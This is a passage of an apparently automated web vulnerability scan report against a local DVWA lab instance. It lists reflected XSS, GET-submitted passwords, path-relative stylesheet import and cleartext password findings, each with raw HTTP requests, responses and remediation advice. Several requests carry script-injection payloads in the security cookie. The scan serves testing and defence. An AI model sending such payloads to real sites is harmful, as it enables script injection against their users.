<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/159.html">CWE-159: Failure to Sanitize Special Element</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/591.html">CAPEC-591: Reflected XSS</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/brute/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low<span class="HIGHLIGHT">ozpd3'%3e%3cscript%3ealert(1)%3c%2fscript%3ecoqwz</span>; PHPSESSID=4qc48621g9prgrubfscrk02qg1<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:36:02 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Set-Cookie: PHPSESSID=4qc48621g9prgrubfscrk02qg1; path=/<br>Set-Cookie: security=low<br>Content-Length: 4356<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.<br><b>...[SNIP]...</b><br>&lt;input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=brute&amp;security=low<span class="HIGHLIGHT">ozpd3'&gt;&lt;script&gt;alert(1)&lt;/script&gt;coqwz</span>&amp;locale=en' )"&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="17.4">17.4.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00400300_passwordsubmittedusinggetmethod">Password submitted using GET method</a></span>
<br><a class="PREVNEXT" href="#17.3">Previous</a>
&nbsp;<a class="PREVNEXT" href="#17.5">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_low_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Low</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/brute/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The page contains a form with the following action URL, which is submitted using the GET method:<ul><li>http://localhost:7878/dvwa/vulnerabilities/brute/</li></ul>The form contains the following password field:<ul><li>password</li></ul></span>
<h2>Issue background</h2>
<span class="TEXT"><p>Some applications use the GET method to submit passwords, which are transmitted within the query string of the requested URL. Sensitive information within URLs may be logged in various locations, including the user's browser, the web server, and any forward or reverse proxy servers between the two endpoints. URLs may also be displayed on-screen, bookmarked or emailed around by users. They may be disclosed to third parties via the Referer header when any off-site links are followed. Placing passwords into the URL increases the risk that they will be captured by an attacker.</p>
<p>Vulnerabilities that result in the disclosure of users' passwords can result in compromises that are extremely difficult to investigate due to obscured audit trails. Even if the application itself only handles non-sensitive information, exposing passwords puts users who have re-used their password elsewhere at risk.</p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>All forms submitting passwords should use the POST method. To achieve this, applications should specify the method attribute of the FORM tag as <b>method="POST"</b>. It may also be necessary to modify the corresponding server-side form handler to ensure that submitted passwords are properly retrieved from the message body, rather than the URL.
</p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/598.html">CWE-598: Information Exposure Through Query Strings in GET Request</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/37.html">CAPEC-37: Retrieve Embedded Sensitive Data</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/brute/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=sq50nqtaoh5btrj1ps2s04s7a4<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:29:52 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4189<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.<br><b>...[SNIP]...</b><br>&lt;/h2&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;form action="#" method="GET"&gt;</span><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;Username:&lt;br /&gt;<br><b>...[SNIP]...</b><br>&lt;br /&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;input type="password" AUTOCOMPLETE="off" name="password"&gt;</span>&lt;br /&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="17.5">17.5.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200328_pathrelativestylesheetimport">Path-relative style sheet import</a></span>
<br><a class="PREVNEXT" href="#17.4">Previous</a>
&nbsp;<a class="PREVNEXT" href="#17.6">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/brute/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
<ol>
<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
<ul>
  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
<li>Setting the HTTP response header "X-Content-Type-Options: nosniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul></span>
<h2>References</h2>
<span class="TEXT"><ul><li><a href="https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/154.html">CAPEC-154: Resource Location Spoofing</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/468.html">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/brute/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=4qc48621g9prgrubfscrk02qg1<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:29:52 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4189<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.<br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/brute/<span class="HIGHLIGHT">index.php/fmex6b/j9h26u/lw8fht/</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=4qc48621g9prgrubfscrk02qg1<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:36:03 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4189<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.<br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET <span class="HIGHLIGHT">/dvwa/vulnerabilities/brute/index.php/fmex6b/dvwa/css/main.css</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=4qc48621g9prgrubfscrk02qg1<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:36:03 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4189<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="17.6">17.6.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00400c00_inputreturnedinresponsereflected">Input returned in response (reflected)</a></span>
<br><a class="PREVNEXT" href="#17.5">Previous</a>
&nbsp;<a class="PREVNEXT" href="#18.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/brute/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>security</b> cookie is copied into the application's response.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/brute/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low<span class="HIGHLIGHT">25mxp12uof</span>; PHPSESSID=4qc48621g9prgrubfscrk02qg1<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:36:01 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Set-Cookie: PHPSESSID=4qc48621g9prgrubfscrk02qg1; path=/<br>Set-Cookie: security=low<br>Content-Length: 4302<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.<br><b>...[SNIP]...</b><br>&lt;input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=brute&amp;security=low<span class="HIGHLIGHT">25mxp12uof</span>&amp;locale=en' )"&gt; &lt;input type="button" value="View Source" class="popup_button" id='source_button' data-source-url='../../vulnerabilities/view_source.php?id=brute&amp;security=low<span class="HIGHLIGHT">25mxp12uof</span>' )"&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH0" id="18">18.&nbsp;http://localhost:7878/dvwa/vulnerabilities/captcha/</span>
<br><a class="PREVNEXT" href="#17">Previous</a>
&nbsp;<a class="PREVNEXT" href="#19">Next</a>
<br>
<span class="BODH1" id="18.1">18.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00300100_cleartextsubmissionofpassword">Cleartext submission of password</a></span>
<br><a class="PREVNEXT" href="#17.6">Previous</a>
&nbsp;<a class="PREVNEXT" href="#18.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_high_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>High</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/captcha/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The page contains a form with the following action URL, which is submitted over clear-text HTTP:<ul><li>http://localhost:7878/dvwa/vulnerabilities/captcha/</li></ul>The form contains the following password fields:<ul><li>password_new</li><li>password_conf</li></ul></span>
<h2>Issue background</h2>
<span class="TEXT"><p>Some applications transmit passwords over unencrypted connections, making them vulnerable to interception. To exploit this vulnerability, an attacker must be suitably positioned to eavesdrop on the victim's network traffic. This scenario typically occurs when a client communicates with the server over an insecure connection such as public Wi-Fi, or a corporate or home network that is shared with a compromised computer. Common defenses such as switched networks are not sufficient to prevent this. An attacker situated in the user's ISP or the application's hosting infrastructure could also perform this attack. Note that an advanced adversary could potentially target any connection made over the Internet's core infrastructure.</p>
<p>Vulnerabilities that result in the disclosure of users' passwords can result in compromises that are extremely difficult to investigate due to obscured audit trails. Even if the application itself only handles non-sensitive information, exposing passwords puts users who have re-used their password elsewhere at risk.</p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>Applications should use transport-level encryption (SSL or TLS) to protect all sensitive communications passing between the client and the server. Communications that should be protected include the login mechanism and related functionality, and any functions where sensitive data can be accessed or privileged actions can be performed. These areas should employ their own session handling mechanism, and the session tokens used should never be transmitted over unencrypted communications. If HTTP cookies are used for transmitting session tokens, then the secure flag should be set to prevent transmission over clear-text HTTP.</p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/319.html">CWE-319: Cleartext Transmission of Sensitive Information</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/117.html">CAPEC-117: Interception</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/captcha/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=j01cbcc8o3ci68h8n3bccs4v9p<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:29:55 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4612<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Insecure CAPTCHA :: Damn Vulnerable Web Application (DVWA<br><b>...[SNIP]...</b><br>&lt;div class="vulnerable_code_area"&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;form action="#" method="POST" style="display:none;"&gt;</span><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;h3&gt;<br><b>...[SNIP]...</b><br>&lt;br /&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;input type="password" AUTOCOMPLETE="off" name="password_new"&gt;</span>&lt;br /&gt;<br><b>...[SNIP]...</b><br>&lt;br /&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;input type="password" AUTOCOMPLETE="off" name="password_conf"&gt;</span>&lt;br /&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="18.2">18.2.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200300_crosssitescriptingreflected">Cross-site scripting (reflected)</a></span>
<br><a class="PREVNEXT" href="#18.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#18.3">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_medium_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Medium</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/captcha/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>c3vak'&gt;&lt;script&gt;alert(1)&lt;/script&gt;liye5</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain "cookie-forcing" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>
